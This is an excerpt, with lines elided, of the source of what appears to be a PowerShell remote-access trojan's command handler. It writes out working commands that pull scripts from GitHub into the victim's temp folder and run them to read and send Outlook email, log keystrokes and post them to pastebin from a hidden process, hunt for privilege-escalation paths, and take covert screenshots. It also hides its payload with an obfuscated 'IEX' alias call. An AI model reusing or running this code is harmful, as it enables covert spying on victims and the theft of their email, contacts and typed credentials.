...
((Get-Content -Path $IPATH$payload_name.ps1 -Raw) -Replace "$ttl","Get-Date -Format 'HH:mm:ss';&(DIR Alias:/I*X)")|Set-Content -Path $IPATH$payload_name.ps1
...
While($Client.Connected)
{
  If(-not ($WaitData))
  {
    ...
    If($Command -ieq "AdvInfo" -or $Command -ieq "adv")
    {
      ...
      write-host "   OutLook   Read remote host OutLook Exchange Email Objects";
      ...
      If($choise -ieq "OutLook")
      {
         ...
         If($OutLook_choise -ieq "Folders")
         {
            ...
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'folders' -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force";
         }
         If($OutLook_choise -ieq "Contacts")
         {
            ...
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'contacts' -maxitems '$MaxOfObjectsToDisplay' -logfile `"$CreateLogFileSetting`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force"
         }
         If($OutLook_choise -ieq "Emails")
         {
            ...
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -MaxItems `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -verb `"$UseVerbose`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force"
         }
         If($OutLook_choise -ieq "Filter" -or $OutLook_choise -ieq "SenderName")
         {
            ...
            Else
            {
               ...
               $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -MaxItems `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -Filter `"$SenderNameSearch`" -verb `"$UseVerbose`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force"
            }
         }
         If($OutLook_choise -ieq "SendMail")
         {
            ...
            Else
            {
               ...
               $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Unblock-File;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'send' -SendTo '$SendTo' -SendSubject '$SendSubject' -SendBody '$SendBody' -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force";
    ...
    If($Command -ieq "keylogger")
    {
        ...
        If($choise -ieq "Start")
        {
           ...
           Write-Host " - Send Kestrokes to pastebin? (y|n): " -NoNewline
           $PasteMe = Read-Host

           ## Start recording system keystrokes
           If($PasteMe -iMatch '^(y|yes)$')
           {
              ...
              ## Use SendToPasteBin + Out-PasteBin cmdlets
              $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Keylogger.ps1`" -outfile `"`$Env:TMP\Keylogger.ps1`"|Unblock-File;iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/SendToPasteBin.ps1`" -OutFile `"`$Env:TMP\SendToPasteBin.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Keylogger.ps1`" -Keylogger Start;Start-Sleep -Seconds 2;Start-Process -WindowStyle hidden powershell -ArgumentList `"-File `$Env:TMP\SendToPasteBin.ps1 -PastebinUsername $PastebinUsername -PastebinPassword $PastebinPassword`";"
           }
           Else
           {
              $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Keylogger.ps1`" -outfile `"`$Env:TMP\Keylogger.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Keylogger.ps1`" -Keylogger Start"
           }
        }
        If($choise -ieq "Stop")
        {
           ## Stop recording system keystrokes
           $Command = "Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Keylogger.ps1 -Destination $Env:TMP\Keylogger.ps1 -ErrorAction SilentlyContinue|Out-Null;powershell -File `"$Env:TMP\Keylogger.ps1`" -Keylogger Stop;Start-sleep -Seconds 2;Remove-Item -Path `"$Env:TMP\Keylogger.ps1`" -Force;Remove-Item -Path `"$Env:TMP\SendToPasteBin.ps1`" -Force"
      ...
      If($choise -ieq "FindEop" -or $choise -ieq "EOP")
      {
        ...
        If($my_choise -ieq "Agressive")
        {
           ...
           If($VerOut -iMatch '^(y|yes)$')
           {
              ...
              $Command = "iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/FindEop.ps1 -OutFile `$Env:TMP\FindEOP.ps1;powershell -File `$Env:TMP\FindEOP.ps1 -verb true;Remove-Item -Path `"`$Env:TMP\FindEOP.ps1`" -Force"
           }
           Else
           {
...
"@;Write-Host $AnwsomeBanner
    ...
    If($Command -ieq "Screenshot")
    {
        ...
        write-host "   Remark: SpyScreen captures screenshots in background and ZIPs all images" -ForegroundColor Yellow;
        write-host "`n`n   Modules     Description                     Remark" -ForegroundColor green;
        write-host "   -------     -----------                     ------";
